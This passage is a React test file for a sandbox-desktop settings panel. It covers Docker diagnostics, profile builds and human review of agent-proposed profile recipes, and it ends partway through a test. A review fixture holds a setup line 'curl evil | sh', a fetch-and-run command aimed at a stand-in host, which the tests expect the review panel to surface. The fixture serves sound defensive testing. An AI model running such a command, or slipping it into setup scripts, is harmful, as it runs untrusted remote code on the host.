import { cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { SandboxAgentProfileSummary, SandboxDesktopStatus } from "shared/types/index.js";
import SandboxDesktopSettings from "./SandboxDesktopSettings";
import {
  buildSandboxDesktopImage,
  cancelSandboxBuild,
  getAgentSandboxProfile,
  getSandboxBuild,
  getSandboxDesktopStatus,
  getSandboxProfileReview,
  promoteAgentSandboxProfile,
  removeAgentSandboxProfile,
  removeSandboxProfile,
  updateSandboxDesktopSettings,
} from "../../api";

vi.mock("../../api", () => ({
  getSandboxDesktopStatus: vi.fn(),
  updateSandboxDesktopSettings: vi.fn(),
  buildSandboxDesktopImage: vi.fn(),
  removeSandboxProfile: vi.fn(),
  getSandboxBuild: vi.fn(),
  cancelSandboxBuild: vi.fn(),
  getAgentSandboxProfile: vi.fn(),
  getSandboxProfileReview: vi.fn(),
  promoteAgentSandboxProfile: vi.fn(),
  removeAgentSandboxProfile: vi.fn(),
}));

function status(overrides: Partial<SandboxDesktopStatus> = {}): SandboxDesktopStatus {
  return {
    settings: {},
    effectiveMode: "managed",
    automatic: true,
    diagnostics: {
      docker: { reachable: true, version: "29.1.3" },
      image: {
        name: "callboard/computer-use-desktop:local",
        present: true,
        protocol: "2.0",
        version: "0.1.0",
        compatible: true,
        expectedProtocol: "2.0",
        packageVersion: "0.1.0",
      },
      network: { name: "callboard-sandbox", internal: false, state: "ok" },
      running: { sessions: 1, limit: 2, containers: 1 },
      endpoint: { configured: false },
    },
    build: { state: "idle" },
    buildCommand: "callboard sandbox build",
    canEdit: true,
    owner: "0123456789abcdef",
    ...overrides,
  };
}

beforeEach(() => {
  vi.mocked(getSandboxDesktopStatus).mockReset();
  vi.mocked(updateSandboxDesktopSettings).mockReset();
  vi.mocked(buildSandboxDesktopImage).mockReset();
  vi.mocked(removeSandboxProfile).mockReset();
  vi.mocked(getAgentSandboxProfile).mockReset();
  vi.mocked(promoteAgentSandboxProfile).mockReset();
  vi.mocked(removeAgentSandboxProfile).mockReset();
});

const blender: NonNullable<SandboxDesktopStatus["profiles"]>[number] = {
  id: "global/blender",
  scope: "global",
  name: "blender",
  description: "Blender 4.5 LTS with software OpenGL.",
  source: "builtin",
  gl: "software",
  requested: { cpus: 8, memoryMb: 4096, homeMb: 2048, sessionMinutes: 60 },
  limits: { cpus: 4, memoryMb: 4096, homeMb: 2048, sessionMinutes: 60 },
  clamped: ["cpus"],
  digest: "d".repeat(64),
  packages: ["libxi6"],
  downloads: [{ url: "https://download.blender.org/release/x.tar.xz", sha256: "b".repeat(64), dest: "blender" }],
  setup: "/opt/blender/blender --version\n",
  path: ["/opt/blender"],
  env: { BLENDER_X: "1" },
  architectures: ["amd64"],
  architectureSupported: true,
  recipe: '{\n  "schema": 1,\n  "name": "blender"\n}',
  image: { name: "callboard/computer-use-profile:blender", state: "missing" },
};
afterEach(() => {
  cleanup();
  vi.restoreAllMocks();
});

describe("Settings → Sandbox desktop", () => {
  it("shows the mode in force, diagnostics and the owner", async () => {
    vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status());
    render(<SandboxDesktopSettings />);
    expect((await screen.findByTestId("sandbox-effective-mode")).textContent).toContain("Managed (local Docker) (automatic)");
    expect(screen.getByTestId("sandbox-diagnostic-docker").textContent).toContain("reachable (server 29.1.3)");
    expect(screen.getByTestId("sandbox-diagnostic-image").textContent).toContain("protocol 2.0 (compatible)");
    expect(screen.getByTestId("sandbox-diagnostic-running").textContent).toContain("1 of 2 managed sandboxes");
    expect(screen.getByText("0123456789abcdef")).toBeTruthy();
    expect(screen.getByRole("button", { name: "Rebuild image" })).toBeTruthy();
  });

  it("edits the kept-for-recovery retention and cap", async () => {
    vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status());
    vi.mocked(updateSandboxDesktopSettings).mockResolvedValue(status({ settings: { keepHours: 72, maxKept: 0 } }));
    render(<SandboxDesktopSettings />);
    const hours = (await screen.findByLabelText("Keep for recovery (hours)")) as HTMLInputElement;
    expect(hours.value).toBe("24");
    expect(hours.min).toBe("1");
    expect(hours.max).toBe("168");
    fireEvent.change(hours, { target: { value: "72" } });
    expect(screen.getByText(/kept this long, then removed/)).toBeTruthy();
    expect(screen.getByText(/across all chats; each holds its memory while paused/)).toBeTruthy();
    expect((screen.getByLabelText("Deliverables storage (GiB)") as HTMLInputElement).value).toBe("5");
    fireEvent.change(screen.getByLabelText("Kept at once"), { target: { value: "0" } });
    fireEvent.click(screen.getByRole("button", { name: /^Save/ }));
    await waitFor(() => expect(updateSandboxDesktopSettings).toHaveBeenCalledWith(expect.objectContaining({ keepHours: 72, maxKept: 0 })));
  });

  it("saves a change, sending automatic as null", async () => {
    vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ settings: { mode: "off" }, automatic: false, effectiveMode: "off" }));
    vi.mocked(updateSandboxDesktopSettings).mockResolvedValue(status({ settings: { network: "none", maxConcurrent: 3 } }));
    // One session is running (the fixture's default), so the mode change asks first.
    vi.spyOn(window, "confirm").mockReturnValue(true);
    render(<SandboxDesktopSettings />);
    fireEvent.change(await screen.findByLabelText("Mode"), { target: { value: "auto" } });
    fireEvent.change(screen.getByLabelText("Network (managed)"), { target: { value: "none" } });
    fireEvent.change(screen.getByLabelText("Sandboxes at once"), { target: { value: "3" } });
    fireEvent.click(screen.getByRole("button", { name: "Save" }));
    await waitFor(() =>
      expect(updateSandboxDesktopSettings).toHaveBeenCalledWith({
        mode: null,
        network: "none",
        cpus: 1,
        memoryMb: 1024,
        maxConcurrent: 3,
        keepHours: 24,
        maxKept: 2,
        deliverablesGb: 5,
        profileMaxCpus: 4,
        profileMaxMemoryMb: 8192,
        profileMaxHomeMb: 4096,
        profileMaxSessionMinutes: 120,
        agentMaxProfilesPerScope: 5,
        agentMaxVersions: 10,
        agentMaxQueuedBuilds: 2,
      }),
    );
  });

  it("is read only for an API key: no save, no build", async () => {
    vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ canEdit: false }));
    render(<SandboxDesktopSettings />);
    expect(await screen.findByText(/Read only/)).toBeTruthy();
    expect((screen.getByRole("button", { name: "Save" }) as HTMLButtonElement).disabled).toBe(true);
    expect((screen.getByRole("button", { name: "Rebuild image" }) as HTMLButtonElement).disabled).toBe(true);
    expect((screen.getByLabelText("Mode") as HTMLSelectElement).disabled).toBe(true);
  });

  it("points at the build when the image is missing, and builds on request", async () => {
    const missing = status({
      effectiveMode: "off",
      problem: "image-missing",
      hint: "Build the image once with `callboard sandbox build`, or with Build image below.",
    });
    missing.diagnostics.image = { ...missing.diagnostics.image, present: false, compatible: false, protocol: undefined, version: undefined };
    vi.mocked(getSandboxDesktopStatus).mockResolvedValue(missing);
    vi.mocked(buildSandboxDesktopImage).mockResolvedValue({ state: "running", startedAt: 1, output: "Step 1/20" });
    render(<SandboxDesktopSettings />);
    expect((await screen.findByTestId("sandbox-effective-mode")).textContent).toContain("callboard sandbox build");
    expect(screen.getByTestId("sandbox-diagnostic-image").textContent).toContain("is not built");
    fireEvent.click(screen.getByRole("button", { name: "Build image" }));
    expect(await screen.findByText("Step 1/20")).toBeTruthy();
    expect(buildSandboxDesktopImage).toHaveBeenCalledTimes(1);
  });

  it("says limits and network apply to sandboxes started after saving", async () => {
    vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status());
    render(<SandboxDesktopSettings />);
    await screen.findByLabelText("Mode");
    expect(screen.getByText(/^Applies to sandboxes started after saving/)).toBeTruthy();
    expect(screen.getByText(/^Limits apply to sandboxes started after saving/)).toBeTruthy();
  });

  it("asks before a mode change that ends running sessions, and saves nothing if declined", async () => {
    const running = status({ settings: {}, automatic: true });
    running.diagnostics.running.sessions = 2;
    vi.mocked(getSandboxDesktopStatus).mockResolvedValue(running);
    vi.mocked(updateSandboxDesktopSettings).mockResolvedValue(status({ settings: { mode: "off" } }));
    const confirm = vi.spyOn(window, "confirm").mockReturnValueOnce(false).mockReturnValueOnce(true);
    try {
      render(<SandboxDesktopSettings />);
      fireEvent.change(await screen.findByLabelText("Mode"), { target: { value: "off" } });
      fireEvent.click(screen.getByRole("button", { name: "Save" }));
      expect(confirm).toHaveBeenLastCalledWith("Changing the mode ends 2 running sandbox sessions. Continue?");
      expect(updateSandboxDesktopSettings).not.toHaveBeenCalled();
      fireEvent.click(screen.getByRole("button", { name: "Save" }));
      await waitFor(() => expect(updateSandboxDesktopSettings).toHaveBeenCalledWith(expect.objectContaining({ mode: "off" })));
    } finally {
      confirm.mockRestore();
    }
  });

  it("does not ask when the mode is unchanged or nothing is running", async () => {
    const running = status({ settings: {}, automatic: true });
    running.diagnostics.running.sessions = 1;
    vi.mocked(getSandboxDesktopStatus).mockResolvedValue(running);
    vi.mocked(updateSandboxDesktopSettings).mockResolvedValue(status());
    const confirm = vi.spyOn(window, "confirm");
    try {
      render(<SandboxDesktopSettings />);
      fireEvent.change(await screen.findByLabelText("Sandboxes at once"), { target: { value: "3" } });
      fireEvent.click(screen.getByRole("button", { name: "Save" }));
      await waitFor(() => expect(updateSandboxDesktopSettings).toHaveBeenCalled());
      expect(confirm).not.toHaveBeenCalled();
    } finally {
      confirm.mockRestore();
    }
  });

  it("reports an out-of-date image as a warning with a rebuild action", async () => {
    const outdated = status({ warning: "image-outdated", warningHint: "The image was not built from the files this Callboard ships." });
    outdated.diagnostics.image = { ...outdated.diagnostics.image, current: false, content: "old", expectedContent: "new" };
    vi.mocked(getSandboxDesktopStatus).mockResolvedValue(outdated);
    render(<SandboxDesktopSettings />);
    expect((await screen.findByTestId("sandbox-effective-mode")).textContent).toContain("Image out of date");
    expect(screen.getByTestId("sandbox-diagnostic-image").textContent).toContain("out of date");
    expect(screen.getByTestId("sandbox-diagnostic-image").textContent).toContain("Sandboxes still start");
    expect(screen.getByRole("button", { name: "Rebuild image (out of date)" })).toBeTruthy();
  });

  it("does not warn when Automatic already means managed and Managed is chosen (the mode in force is unchanged)", async () => {
    const running = status({ settings: {}, automatic: true, effectiveMode: "managed" });
    running.diagnostics.running.sessions = 2;
    vi.mocked(getSandboxDesktopStatus).mockResolvedValue(running);
    vi.mocked(updateSandboxDesktopSettings).mockResolvedValue(status({ settings: { mode: "managed" }, automatic: false }));
    const confirm = vi.spyOn(window, "confirm");
    render(<SandboxDesktopSettings />);
    fireEvent.change(await screen.findByLabelText("Mode"), { target: { value: "managed" } });
    fireEvent.click(screen.getByRole("button", { name: "Save" }));
    await waitFor(() => expect(updateSandboxDesktopSettings).toHaveBeenCalledWith(expect.objectContaining({ mode: "managed" })));
    expect(confirm).not.toHaveBeenCalled();
  });

  it("does warn when Automatic means endpoint and Managed is chosen", async () => {
    const running = status({ settings: {}, automatic: true, effectiveMode: "endpoint" });
    running.diagnostics.running.sessions = 1;
    running.diagnostics.endpoint = { configured: true, url: "http://127.0.0.1:7801" };
    vi.mocked(getSandboxDesktopStatus).mockResolvedValue(running);
    const confirm = vi.spyOn(window, "confirm").mockReturnValue(false);
    render(<SandboxDesktopSettings />);
    fireEvent.change(await screen.findByLabelText("Mode"), { target: { value: "managed" } });
    fireEvent.click(screen.getByRole("button", { name: "Save" }));
    expect(confirm).toHaveBeenCalledWith("Changing the mode ends 1 running sandbox session. Continue?");
    expect(updateSandboxDesktopSettings).not.toHaveBeenCalled();
  });

  it("reports an image below the security floor as refused, with a security rebuild action", async () => {
    const insecure = status({ effectiveMode: "off", problem: "image-insecure", hint: "The image has a known security issue." });
    insecure.diagnostics.image = { ...insecure.diagnostics.image, secure: false, securityFloor: 0, requiredSecurityFloor: 1 };
    vi.mocked(getSandboxDesktopStatus).mockResolvedValue(insecure);
    render(<SandboxDesktopSettings />);
    expect((await screen.findByTestId("sandbox-diagnostic-image")).textContent).toContain("known security issue (security level 0, at least 1 required)");
    expect(screen.getByRole("button", { name: "Rebuild image (security fix)" })).toBeTruthy();
  });

  it("lists profiles with their state and clamped limits, builds one, and shows its build log", async () => {
    const outdated = {
      ...blender,
      name: "test",
      image: { name: "callboard/computer-use-profile:test", state: "outdated" as const, outdatedBy: ["base" as const], sizeBytes: 300 * 1024 * 1024 },
    };
    vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [blender, outdated] }));
    vi.mocked(buildSandboxDesktopImage).mockResolvedValue({
      state: "running",
      profile: "blender",
      startedAt: 1,
      output: "Downloading https://download.blender.org/…",
    });
    render(<SandboxDesktopSettings />);
    const card = await screen.findByTestId("sandbox-profile-blender");
    expect(card.textContent).toContain("Not built");
    expect(card.textContent).toContain("4 CPUs");
    expect(card.textContent).toContain("(capped)");
    expect(card.textContent).toContain("4 GiB memory");
    expect(card.textContent).toContain("60 min sessions");
    expect(card.textContent).toContain("Software OpenGL");
    expect(screen.getByTestId("sandbox-profile-test").textContent).toContain("Out of date");
    expect(screen.getByTestId("sandbox-profile-test").textContent).toContain("300 MB");
    fireEvent.click(screen.getByRole("button", { name: "Build profile blender" }));
    // A built-in: one click, no review, no digest.
    await waitFor(() => expect(buildSandboxDesktopImage).toHaveBeenCalledWith("blender", "global", undefined));
    expect((await screen.findByTestId("sandbox-build-log")).textContent).toContain("Downloading");
    expect(screen.getByText("Building profile blender…")).toBeTruthy();
    // Builds queue (one runs at a time): another can still be asked for, and removing waits only for that profile's own build.
    expect((screen.getByRole("button", { name: "Rebuild profile test" }) as HTMLButtonElement).disabled).toBe(false);
    expect((screen.getByRole("button", { name: "Remove profile test's image" }) as HTMLButtonElement).disabled).toBe(false);
  });

  it("removes a profile's image after asking", async () => {
    const built = { ...blender, image: { ...blender.image, state: "current" as const } };
    vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [built] }));
    vi.mocked(removeSandboxProfile).mockResolvedValue({ removed: true, status: status({ profiles: [blender] }) });
    const confirm = vi.spyOn(window, "confirm").mockReturnValue(true);
    render(<SandboxDesktopSettings />);
    fireEvent.click(await screen.findByRole("button", { name: "Remove profile blender's image" }));
    expect(confirm).toHaveBeenCalled();
    await waitFor(() => expect(removeSandboxProfile).toHaveBeenCalledWith("blender", "global"));
    expect((await screen.findByTestId("sandbox-profile-blender")).textContent).toContain("Not built");
  });

  it("is read only for an API key: profiles can't be built or removed, caps can't be changed", async () => {
    const built = { ...blender, image: { ...blender.image, state: "current" as const } };
    vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ canEdit: false, profiles: [built] }));
    render(<SandboxDesktopSettings />);
    expect(((await screen.findByRole("button", { name: "Rebuild profile blender" })) as HTMLButtonElement).disabled).toBe(true);
    expect((screen.getByRole("button", { name: "Remove profile blender's image" }) as HTMLButtonElement).disabled).toBe(true);
    expect((screen.getByLabelText("Max session (minutes)") as HTMLInputElement).disabled).toBe(true);
  });

  it("edits the profile caps within their bounds", async () => {
    vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status());
    vi.mocked(updateSandboxDesktopSettings).mockResolvedValue(status({ settings: { profileMaxSessionMinutes: 240 } }));
    render(<SandboxDesktopSettings />);
    const minutes = (await screen.findByLabelText("Max session (minutes)")) as HTMLInputElement;
    expect([minutes.value, minutes.min, minutes.max]).toEqual(["120", "5", "480"]);
    fireEvent.change(minutes, { target: { value: "240" } });
    fireEvent.click(screen.getByRole("button", { name: "Save" }));
    await waitFor(() => expect(updateSandboxDesktopSettings).toHaveBeenCalledWith(expect.objectContaining({ profileMaxSessionMinutes: 240 })));
  });

  it("shows the whole recipe, the setup script included, and says when this host cannot build a profile", async () => {
    const elsewhere = { ...blender, architectureSupported: false };
    vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [elsewhere] }));
    render(<SandboxDesktopSettings />);
    const recipe = await screen.findByTestId("sandbox-profile-recipe-blender");
    expect(recipe.textContent).toContain("/opt/blender/blender --version");
    expect(recipe.textContent).toContain("run at build time as the unprivileged desktop user, with no network");
    expect(recipe.textContent).toContain("BLENDER_X=1");
    expect(recipe.textContent).toContain("PATH additions: /opt/blender");
    expect(recipe.textContent).toContain(`sha256 ${"b".repeat(64)}`);
    expect(recipe.textContent).toContain('"schema": 1');
    expect(screen.getByTestId("sandbox-profile-blender").textContent).toContain("Builds only on amd64");
    expect((screen.getByRole("button", { name: "Build profile blender" }) as HTMLButtonElement).disabled).toBe(true);
    expect(screen.getByTestId("sandbox-profile-blender").textContent).toContain("home (counts toward memory)");
  });

  it("names the new refusal states", async () => {
    const changed = { ...blender, image: { ...blender.image, state: "rebuild-required" as const } };
    const foreign = { ...blender, name: "other", id: "global/other", image: { ...blender.image, name: "x:other", state: "unlabelled" as const } };
    vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [changed, foreign] }));
    render(<SandboxDesktopSettings />);
    expect((await screen.findByTestId("sandbox-profile-blender")).textContent).toContain("Refused: recipe changed");
    expect(screen.getByTestId("sandbox-profile-other").textContent).toContain("Refused: unlabelled");
  });

  it("lists builds with their phases, shows any build's log on request, and cancels a queued or running one", async () => {
    const running = {
      state: "running" as const,
      id: "11111111-1111-1111-1111-111111111111",
      kind: "profile" as const,
      phase: "running" as const,
      profile: "blender",
      profileId: "global/blender",
      requestedAt: 2,
    };
    const queued = { state: "running" as const, id: "22222222-2222-2222-2222-222222222222", kind: "base" as const, phase: "queued" as const, requestedAt: 3 };
    const done = {
      state: "failed" as const,
      id: "33333333-3333-3333-3333-333333333333",
      kind: "profile" as const,
      phase: "cancelled" as const,
      profile: "test",
      profileId: "global/test",
      requestedAt: 1,
    };
    vi.mocked(getSandboxDesktopStatus).mockResolvedValue(
      status({ profiles: [blender], build: { ...running, output: "running output" }, builds: [queued, running, done] }),
    );
    vi.mocked(getSandboxBuild).mockResolvedValue({ ...done, output: "the cancelled build's log" });
    vi.mocked(cancelSandboxBuild).mockResolvedValue({ ...queued, state: "failed", phase: "cancelled" });
    render(<SandboxDesktopSettings />);
    const list = await screen.findByTestId("sandbox-build-list");
    expect(screen.getByTestId(`sandbox-build-${queued.id}`).textContent).toContain("Queued");
    expect(screen.getByTestId(`sandbox-build-${running.id}`).textContent).toContain("Running");
    expect(screen.getByTestId(`sandbox-build-${done.id}`).textContent).toContain("Cancelled");
    // The base build is queued behind the running profile build: its button waits, and the profile's remove waits too.
    expect((screen.getByRole("button", { name: /Building…/ }) as HTMLButtonElement).disabled).toBe(true);
    expect(list.textContent).toContain("One runs at a time");
    fireEvent.click(screen.getByRole("button", { name: "View the log of profile global/test" }));
    await waitFor(() => expect(getSandboxBuild).toHaveBeenCalledWith(done.id));
    expect(await screen.findByText("the cancelled build's log")).toBeTruthy();
    expect(screen.queryByRole("button", { name: "Cancel the build of profile global/test" })).toBeNull();
    fireEvent.click(screen.getByRole("button", { name: "Cancel the build of the base image" }));
    await waitFor(() => expect(cancelSandboxBuild).toHaveBeenCalledWith(queued.id));
  });

  it("an API key sees the builds but cannot cancel one", async () => {
    const running = { state: "running" as const, id: "11111111-1111-1111-1111-111111111111", kind: "base" as const, phase: "running" as const, requestedAt: 2 };
    vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ canEdit: false, profiles: [blender], build: running, builds: [running] }));
    render(<SandboxDesktopSettings />);
    expect(((await screen.findByRole("button", { name: "Cancel the build of the base image" })) as HTMLButtonElement).disabled).toBe(true);
  });

  describe("agent-built profiles", () => {
    const scoped: NonNullable<SandboxDesktopStatus["profiles"]>[number] = {
      ...blender,
      id: "w0123456789ab/inkscape",
      scope: "w0123456789ab",
      name: "inkscape",
      description: "<b>Inkscape</b> for SVG work.",
      source: "agent",
      agent: { version: 3, versions: 3, createdBy: "chat-1", ownerLabel: "workspace Design" },
      image: { name: "callboard/computer-use-profile:w0123456789ab-inkscape", state: "current" },
    };
    const promoted: NonNullable<SandboxDesktopStatus["profiles"]>[number] = {
      ...scoped,
      id: "global/gimp",
      scope: "global",
      name: "gimp",
      agent: { version: 2, versions: 2, createdBy: "chat-2", promoted: { at: 1, fromScope: "w0123456789ab", fromVersion: 4 } },
    };
    const detail: SandboxAgentProfileSummary = {
      id: scoped.id,
      scope: scoped.scope,
      name: "inkscape",
      description: "Inkscape",
      ownerLabel: "workspace Design",
      current: 3,
      createdAt: 1,
      createdBy: "chat-1",
      versions: [
        {
          version: 2,
          digest: "b",
          state: "superseded" as const,
          proposedAt: 2,
          proposedBy: "chat-1",
          buildId: "build-2",
          recipe: '{\n  "name": "inkscape",\n  "packages": ["inkscape"]\n}',
        },
        {
          version: 3,
          digest: "c",
          state: "approved" as const,
          proposedAt: 3,
          proposedBy: "chat-1",
          buildId: "build-3",
          note: "Adds fonts so text renders.",
          recipe: '{\n  "name": "inkscape",\n  "packages": ["inkscape", "fonts-dejavu"]\n}',
        },
        { version: 4, digest: "d", state: "proposed" as const, proposedAt: 4, proposedBy: "chat-1", pending: true, recipe: '{\n  "name": "inkscape"\n}' },
      ],
    };

    it("badges agent-built and promoted profiles with their version and owner, as plain text", async () => {
      vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [blender, scoped, promoted] }));
      render(<SandboxDesktopSettings />);
      const card = await screen.findByTestId("sandbox-profile-inkscape");
      expect(screen.getByTestId("sandbox-profile-badge-inkscape").textContent).toContain("agent-built · v3");
      expect(card.textContent).toContain("Proposed by an agent and approved by a human");
      expect(card.textContent).toContain("workspace Design");
      // Agent-written text is never HTML.
      expect(card.textContent).toContain("<b>Inkscape</b> for SVG work.");
      expect(card.querySelector("b")).toBeNull();
      expect(screen.getByTestId("sandbox-profile-badge-gimp").textContent).toContain("promoted from agent · v2");
      expect(screen.queryByTestId("sandbox-profile-badge-blender")).toBeNull();
      // Promote only for a non-global scope; agent profiles get Remove, not Remove image.
      expect(screen.getByRole("button", { name: "Promote profile inkscape to global" })).toBeTruthy();
      expect(screen.queryByRole("button", { name: "Promote profile gimp to global" })).toBeNull();
      expect(screen.queryByRole("button", { name: "Remove profile inkscape's image" })).toBeNull();
      expect(screen.getByRole("button", { name: "Rebuild profile inkscape" })).toBeTruthy();
    });

    it("hides the agent actions from an API key", async () => {
      vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ canEdit: false, profiles: [scoped] }));
      render(<SandboxDesktopSettings />);
      await screen.findByTestId("sandbox-profile-inkscape");
      expect(screen.queryByRole("button", { name: "History of profile inkscape" })).toBeNull();
      expect(screen.queryByRole("button", { name: "Promote profile inkscape to global" })).toBeNull();
      expect(screen.queryByRole("button", { name: "Remove agent profile inkscape" })).toBeNull();
    });

    it("promotes after confirming, and not when declined", async () => {
      vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [scoped] }));
      vi.mocked(promoteAgentSandboxProfile).mockResolvedValue({
        profile: { ...detail, scope: "global", id: "global/inkscape" },
        image: "callboard/computer-use-profile:inkscape",
        status: status({ profiles: [{ ...promoted, name: "inkscape", id: "global/inkscape" }] }),
      });
      const confirm = vi.spyOn(window, "confirm").mockReturnValueOnce(false).mockReturnValueOnce(true);
      render(<SandboxDesktopSettings />);
      fireEvent.click(await screen.findByRole("button", { name: "Promote profile inkscape to global" }));
      expect(confirm.mock.calls[0]![0]).toMatch(/usable by every chat.*exact image you tested.*relabelled.*nothing is rebuilt/);
      expect(promoteAgentSandboxProfile).not.toHaveBeenCalled();
      fireEvent.click(screen.getByRole("button", { name: "Promote profile inkscape to global" }));
      await waitFor(() => expect(promoteAgentSandboxProfile).toHaveBeenCalledWith("inkscape", "w0123456789ab"));
      expect((await screen.findByTestId("sandbox-profile-badge-inkscape")).textContent).toContain("promoted from agent");
    });

    it("removes an agent profile with the agent-profile call after confirming, and shows its error", async () => {
      vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [scoped] }));
      vi.mocked(removeAgentSandboxProfile).mockRejectedValue(new Error("A container is using that image"));
      const confirm = vi.spyOn(window, "confirm").mockReturnValue(true);
      render(<SandboxDesktopSettings />);
      fireEvent.click(await screen.findByRole("button", { name: "Remove agent profile inkscape" }));
      expect(confirm.mock.calls[0]![0]).toMatch(/forgets every version/);
      await waitFor(() => expect(removeAgentSandboxProfile).toHaveBeenCalledWith("inkscape", "w0123456789ab"));
      expect(removeSandboxProfile).not.toHaveBeenCalled();
      expect((await screen.findByRole("alert")).textContent).toContain("A container is using that image");
    });

    it("shows the history newest first, with the agent's note, a recipe and a diff against the previous version", async () => {
      vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [scoped] }));
      vi.mocked(getAgentSandboxProfile).mockResolvedValue(detail);
      render(<SandboxDesktopSettings />);
      fireEvent.click(await screen.findByRole("button", { name: "History of profile inkscape" }));
      const history = await screen.findByTestId(`sandbox-agent-history-${scoped.id}`);
      expect(getAgentSandboxProfile).toHaveBeenCalledWith("inkscape", "w0123456789ab");
      const rows = history.querySelectorAll("[data-testid^='sandbox-agent-version-']");
      expect([...rows].map((row) => row.getAttribute("data-testid"))).toEqual([4, 3, 2].map((v) => `sandbox-agent-version-${scoped.id}-${v}`));
      const v4 = screen.getByTestId(`sandbox-agent-version-${scoped.id}-4`);
      expect(v4.textContent).toContain("card open in chat");
      expect(v4.textContent).toContain("Proposed, not approved");
      const v3 = screen.getByTestId(`sandbox-agent-version-${scoped.id}-3`);
      expect(v3.textContent).toContain("Approved (in force)");
      expect(v3.textContent).toContain("build build-3");
      expect(v3.textContent).toContain("The agent's note (its own words, unverified)");
      expect(v3.textContent).toContain("Adds fonts so text renders.");
      // The oldest kept version has nothing to diff against.
      expect(screen.queryByRole("button", { name: /^Diff v2 against/ })).toBeNull();
      fireEvent.click(screen.getByRole("button", { name: "View the recipe of v2" }));
      expect(screen.getByTestId(`sandbox-agent-version-${scoped.id}-2`).querySelector("pre")!.textContent).toContain('"packages": ["inkscape"]');
      fireEvent.click(screen.getByRole("button", { name: "Diff v3 against v2" }));
      const diff = screen.getByTestId(`sandbox-agent-diff-${scoped.id}-3`);
      // The fields other than setup, as JSON, line by line.
      const added = [...diff.querySelectorAll("[data-op='add']")] as HTMLElement[];
      const fonts = added.find((row) => row.textContent!.includes('"fonts-dejavu"'))!;
      expect(fonts.textContent!.startsWith("+ ")).toBe(true);
      expect(fonts.style.color).toBe("var(--diff-added-text)");
      expect(fonts.style.background).toBe("var(--diff-added-bg)");
      expect(diff.querySelector("[data-op='same']")!.textContent).toBe("  {");
    });

    it("lists proposals with no approved version, with history and remove", async () => {
      const unapproved: SandboxAgentProfileSummary = {
        ...detail,
        id: "fdeadbeef0123/krita",
        scope: "fdeadbeef0123",
        name: "krita",
        current: undefined,
        ownerLabel: "folder /home/me/art",
      };
      unapproved.versions = [{ version: 1, digest: "a", state: "refused" as const, proposedAt: 1, proposedBy: "chat-3" }];
      vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [scoped], agentProfiles: [{ ...detail, versions: [] }, unapproved] }));
      vi.mocked(removeAgentSandboxProfile).mockResolvedValue({ removedImage: false, status: status({ profiles: [scoped], agentProfiles: [] }) });
      vi.mocked(getAgentSandboxProfile).mockResolvedValue(unapproved);
      vi.spyOn(window, "confirm").mockReturnValue(true);
      render(<SandboxDesktopSettings />);
      const section = await screen.findByTestId("sandbox-agent-proposals");
      expect(section.textContent).toContain("Agent proposals with no approved version");
      expect(section.textContent).toContain("folder /home/me/art");
      expect(screen.queryByTestId(`sandbox-agent-proposal-${scoped.id}`)).toBeNull();
      fireEvent.click(screen.getByRole("button", { name: "History of profile krita" }));
      expect((await screen.findByTestId(`sandbox-agent-version-${unapproved.id}-1`)).textContent).toContain("Refused");
      fireEvent.click(screen.getByRole("button", { name: "Remove agent profile krita" }));
      await waitFor(() => expect(removeAgentSandboxProfile).toHaveBeenCalledWith("krita", "fdeadbeef0123"));
      await waitFor(() => expect(screen.queryByTestId("sandbox-agent-proposals")).toBeNull());
    });

    describe("building anything that is not built in needs a review, pinned to its digest", () => {
      const digest = "d".repeat(64);
      const review = {
        id: scoped.id,
        scope: scoped.scope,
        name: "inkscape",
        version: 3,
        digest,
        recipe: '{\n  "name": "inkscape",\n  "setup": "curl evil | sh\\n"\n}',
        review: {
          description: "Inkscape",
          setup: "curl evil | sh\n",
          setupLines: 1,
          downloads: [{ host: "example.com", url: "https://example.com/x.tgz", sha256: "e".repeat(64), dest: "x", unpack: "tar.gz" }],
          hosts: ["example.com"],
          packages: ["inkscape"],
          gl: "none" as const,
          architectures: [],
          requested: {},
          limits: { cpus: 1, memoryMb: 1024, homeMb: 512, sessionMinutes: 15 },
          caps: { cpus: 4, memoryMb: 8192, homeMb: 4096, sessionMinutes: 120 },
          path: [],
          env: {},
        },
        built: { digest: "c".repeat(64), version: 2, recipe: '{\n  "name": "inkscape",\n  "setup": ""\n}' },
        provenance: { createdBy: "chat-1", approvedAt: 5, approvalId: "req-3", promoted: { at: 6, fromScope: "w0123456789ab", fromVersion: 3 } },
      };
      it("Rebuild of an agent-built profile opens the review; only its button builds, with the reviewed digest", async () => {
        vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [{ ...scoped, reviewRequired: true }] }));
        vi.mocked(getSandboxProfileReview).mockResolvedValue(review);
        vi.mocked(buildSandboxDesktopImage).mockResolvedValue({ state: "running", phase: "queued" });
        render(<SandboxDesktopSettings />);
        fireEvent.click(await screen.findByRole("button", { name: "Rebuild profile inkscape" }));
        const panel = await screen.findByTestId("sandbox-profile-review-inkscape");
        expect(buildSandboxDesktopImage).not.toHaveBeenCalled();
        expect(getSandboxProfileReview).toHaveBeenCalledWith("inkscape", "w0123456789ab");
        expect(panel.textContent).toContain("curl evil | sh");
        expect(panel.textContent).toContain("from example.com");
        expect(panel.textContent).toContain(digest);
        // The diff against what is built now, setup on its own.
        expect(panel.querySelector("[data-testid='proposal-diff-setup'] [data-op='add']")!.textContent).toBe("+ curl evil | sh");
        // Provenance is the store's claim, labelled as such.
